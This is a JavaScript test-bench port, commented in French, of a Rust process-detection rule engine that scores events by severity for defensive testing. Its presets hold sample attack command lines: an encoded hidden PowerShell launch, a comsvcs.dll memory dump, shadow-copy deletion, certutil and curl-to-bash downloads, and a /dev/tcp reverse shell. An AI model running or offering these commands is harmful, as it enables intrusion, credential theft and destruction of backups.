// Banc d'essai : portage JS simplifié du moteur Rust (crates/common/src/rules.rs + event.rs).
// Ne couvre que les règles `process_start` à conditions plates (`all`) et `lineage`.
// Non portés : `expr` (Sigma importé), regex, cidr, détecteurs B001-B004, YARA-X,
// score par hôte avec décroissance, allowlist, corrélation.
export const WEIGHT = { info: 5, low: 15, medium: 40, high: 70, critical: 100 };

// Rust : to_ascii_lowercase / eq_ignore_ascii_case -> ASCII uniquement (pas toLowerCase Unicode).
export const lo = s => (s || '').replace(/[A-Z]/g, c => String.fromCharCode(c.charCodeAt(0) + 32));
export const baseName = p => lo((p || '').split(/[\\/]/).pop());

export const OPS = {
  equals: (h, n) => h === n,
  contains: (h, n) => h.includes(n),
  starts_with: (h, n) => h.startsWith(n),
  ends_with: (h, n) => h.endsWith(n),
};

// ev = { image, commandLine, ancestors: [parent, grand-parent, …] }
export function field(ev, name) {
  switch (name) {
    case 'Image': return ev.image || '';
    case 'ImageName': return ev.image ? baseName(ev.image) : '';
    case 'CommandLine': return ev.commandLine || '';
    case 'ParentImage': return ev.ancestors[0] || '';
    case 'ParentImageName': return ev.ancestors[0] ? baseName(ev.ancestors[0]) : '';
    default: return ''; // champ inconnu = None en Rust -> condition fausse
  }
}

export function evaluate(rules, ev) {
  const hits = [];
  for (const r of rules) {
    if (r.kind !== 'process_start' || r.expr) continue;
    const why = [];
    if (r.lineage) {
      const L = r.lineage, child = baseName(ev.image);
      if (!L.children.some(c => lo(c) === child)) continue;
      const pool = L.ancestor ? ev.ancestors.map(baseName) : [baseName(ev.ancestors[0])];
      const p = L.parents.find(x => pool.includes(lo(x)));
      if (!p) continue;
      why.push({ field: 'lineage', op: L.ancestor ? 'ancestor' : 'parent', value: p });
    }
    let ok = true;
    for (const c of r.all || []) {
      const raw = field(ev, c.field), op = OPS[c.op];
      const v = raw && op ? c.values.find(x => op(lo(raw), lo(x))) : undefined;
      if (v === undefined) { ok = false; break; }
      why.push({ field: c.field, op: c.op, value: v });
    }
    if (ok) hits.push({ rule: r, why, score: Math.round(WEIGHT[r.severity] * (r.confidence ?? 1)) });
  }
  return hits;
}

// Préréglages (vérifiés contre rules.json, cf. le test node dans le rapport de build).
export const PRESETS = {
  macro: ['C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'C:\\Program Files\\Microsoft Office\\winword.exe, C:\\Windows\\explorer.exe', 'powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgA'],
  comsvcs: ['C:\\Windows\\System32\\rundll32.exe', 'C:\\Windows\\System32\\cmd.exe', 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\l.dmp full'],
  shadow: ['C:\\Windows\\System32\\vssadmin.exe', 'C:\\Windows\\System32\\cmd.exe', 'vssadmin delete shadows /all /quiet'],
  certutil: ['C:\\Windows\\System32\\certutil.exe', 'C:\\Windows\\System32\\cmd.exe', 'certutil -urlcache -split -f http://example.test/a.exe a.exe'],
  curlbash: ['/usr/bin/bash', '/usr/bin/sshd', 'bash -c "curl -fsSL http://example.test/x.sh | bash"'],
  devtcp: ['/usr/bin/bash', '/usr/bin/sshd', 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1'],
  osascript: ['/usr/bin/osascript', '/bin/zsh', 'osascript -e \'do shell script "id"\''],
  svchost: ['C:\\Users\\Public\\svchost.exe', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', 'svchost.exe'],
  notepad: ['C:\\Windows\\System32\\notepad.exe', 'C:\\Windows\\explorer.exe', 'notepad.exe C:\\Users\\a\\notes.txt'],
};

export const toEvent = (image, ancestors, commandLine) => ({
  image: image.trim(),
  commandLine, // non rognée : le moteur Rust compare la ligne de commande telle quelle
  ancestors: ancestors.split(',').map(s => s.trim()).filter(Boolean),
});
